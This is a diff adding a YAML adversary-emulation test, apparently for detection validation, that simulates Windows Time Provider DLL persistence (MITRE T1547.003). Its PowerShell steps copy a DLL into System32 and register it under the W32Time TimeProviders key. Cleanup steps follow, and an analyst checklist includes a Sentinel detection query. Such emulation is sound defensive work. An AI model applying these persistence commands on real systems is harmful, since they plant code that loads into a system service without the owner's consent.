@@ -1,0 +1,85 @@
+id: T1547.003_boot_logon_autostart_time_providers
+name: "Boot or Logon Autostart Execution — Time Providers"
+mitre_technique: "T1547.003"
+mitre_tactic: "persistence"
+description: >
+  Adversaries abuse the Windows Time service (W32Time) DLL provider mechanism to load
+  a malicious DLL at system startup. Time provider DLLs are registered under
+  HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders and are loaded by
+  the Windows Time service (svchost.exe hosting W32Time) at boot. A registered DLL
+  runs as NETWORK SERVICE and is loaded into svchost.exe — providing persistent
+  code execution that blends with legitimate time synchronisation traffic.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1547/003/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1547.003 — Time Provider DLL persistence simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Enumerate existing time providers — establish baseline"
+    command: |
+      Write-Host "[PAS] Current W32Time providers:"
+      $providerKey = "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders"
+      Get-ChildItem $providerKey -ErrorAction SilentlyContinue | ForEach-Object {
+          $dll = (Get-ItemProperty $_.PSPath -Name DllName -ErrorAction SilentlyContinue).DllName
+          Write-Host "  Provider: $($_.PSChildName) -> $dll"
+      }
+
+  - step: 3
+    type: exec_powershell
+    description: "Register malicious time provider DLL — loads into W32Time svchost"
+    command: |
+      $malDll = "$env:SystemRoot\System32\PAS_T1547_003_timeprov.dll"
+      Copy-Item "$env:SystemRoot\System32\w32time.dll" $malDll -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS] Malicious time provider DLL dropped: $malDll"
+
+      $provPath = "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\PAS_T1547_003"
+      New-Item -Path $provPath -Force | Out-Null
+      Set-ItemProperty -Path $provPath -Name "DllName"  -Value $malDll   -Type String
+      Set-ItemProperty -Path $provPath -Name "Enabled"  -Value 1         -Type DWord
+      Set-ItemProperty -Path $provPath -Name "InputProvider" -Value 0    -Type DWord
+      Write-Host "[PAS] Time provider registered: $provPath"
+      Write-Host "[PAS] Will load into W32Time svchost at next service restart"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — new key under HKLM\\...\\W32Time\\TimeProviders, new DLL in System32"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove malicious time provider and DLL"
+    command: |
+      $provPath = "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\PAS_T1547_003"
+      Remove-Item $provPath -Recurse -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Time provider registry key removed"
+
+      Remove-Item "$env:SystemRoot\System32\PAS_T1547_003_timeprov.dll" `
+          -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Time provider DLL removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1547.003 cleanup complete"
+
+analyst_checklist:
+  - "Registry event: new key created under HKLM\\SYSTEM\\...\\W32Time\\TimeProviders"
+  - "File event: new DLL dropped in System32 coinciding with W32Time provider registry change"
+  - "Sentinel: DeviceRegistryEvents | where RegistryKey contains 'W32Time\\\\TimeProviders' and ActionType == 'RegistryKeyCreated'"
+  - "MDE alert: 'Suspicious time provider DLL registered'"
+  - "CONTROL CHECK: Baseline W32Time providers — only NtpClient and NtpServer are legitimate defaults"
+  - "CONTROL CHECK: Any new entry under TimeProviders should be treated as malicious until proven otherwise"
